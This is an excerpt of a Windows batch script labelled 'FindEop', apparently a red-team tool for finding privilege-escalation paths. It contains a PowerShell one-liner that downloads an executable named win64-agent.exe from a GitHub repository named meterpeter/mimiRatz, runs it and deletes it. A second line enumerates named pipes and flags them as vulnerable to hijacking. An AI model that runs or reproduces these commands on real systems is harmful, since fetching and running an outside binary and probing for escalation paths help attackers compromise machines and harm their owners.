...
:: ----
TITLE FindEop v1.3.19 {SSA RedTeam @2022}


:: Local variables
SET LocalPath=%cd%
SET BatVersion=v1.3.19
...
powershell -C "iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/win64-agent.exe -OutFile $Env:TMP\win64-agent.exe;$location = (Get-Location).Path;cd $Env:TMP;.\win64-agent.exe -spooler -srvhost;cd $location;Remove-Item $Env:TMP\win64-agent.exe -Force"
echo.
echo.
...
powershell -C "$CheckPipes = (Get-ChildItem \\.\pipe\ -EA SilentlyContinue).FullName;If($CheckPipes){Write-Host '[System.IO.Pipes] => [VULNERABLE::T1574]' -ForeGroundColor Green -BackGroundColor Black;$Report = $CheckPipes|Select -Skip 1|Select -First 5;echo $Report}Else{Write-Host 'ERROR: None Name Pipes found ..'}"
echo.
echo.
